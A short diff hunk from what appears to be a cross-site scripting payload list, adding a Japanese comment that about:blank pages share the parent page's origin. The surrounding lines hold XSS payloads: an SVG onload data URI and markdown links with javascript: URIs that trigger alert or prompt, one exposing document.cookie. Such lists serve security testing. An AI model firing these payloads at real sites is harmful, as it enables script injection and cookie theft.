@@ -982,4 +982,5 @@ data:text/html<svg/onload=parentNode.parentNode.parentNode[/locatio/.source+/n/.
 [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
 [test](javascript://%0d%0aprompt(1))
 [test](javascript://%0d%0aprompt(1);com)
+?あー、about:blankだから親ページのオリジンと筒抜けやね。
 /* RFI STOP */
